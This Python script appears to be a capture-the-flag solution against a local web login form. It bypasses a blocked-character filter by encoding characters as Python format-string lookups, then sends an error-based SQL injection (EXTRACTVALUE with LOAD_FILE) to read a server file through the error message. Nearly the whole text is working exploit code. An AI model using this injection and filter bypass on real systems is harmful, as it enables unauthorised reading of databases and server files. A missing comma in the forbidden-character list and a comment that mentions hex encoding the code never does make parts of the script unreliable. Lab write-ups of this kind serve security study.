import string, requests, binascii, re, random

URL = 'http://127.0.0.1:5002'
#============= Grep error ====================================================================

pattern = r'<li\ class="flash\-error">[\s\S]*?</li>'
def grep_error(response):
    result = re.findall(pattern,response)
    if result:
        print(result[0])
    else:
        print("No error found.")
    return

#============= Generate valid SQL query ======================================================
FORBIDDEN_CHARACTERS = ['"', "(", ")", " ", "," , "'", "\\", "/", "*", "+" "%", "-", ";", "#"] # length = 13
variable = dict(zip(FORBIDDEN_CHARACTERS, string.ascii_lowercase))

def gen_payload(a):
    var = variable[a]
    idx = FORBIDDEN_CHARACTERS.index(a)
    #username = '{x}{x.FORBIDDEN_CHARACTERS[5]}'    
    return f"{{{var}}}{{{var}.FORBIDDEN_CHARACTERS[{idx}]}}"

def encode(sql):
    pay_load = ""
    
    for i in sql:
        if i in variable:
            pay_load += gen_payload(i)
        else:
            pay_load += i
            
    return pay_load

#================ Extract flag via Error-based SQLi ==============================

s = requests.Session()

# HEX encode because single and double quotes are blocked
username = encode("' AND EXTRACTVALUE(1,CONCAT(0x7e,LOAD_FILE('/tmp/bbt')))-- -")
r = s.post(url = URL, data = {'username':username, 'password': 'bbt'})
grep_error(r.text)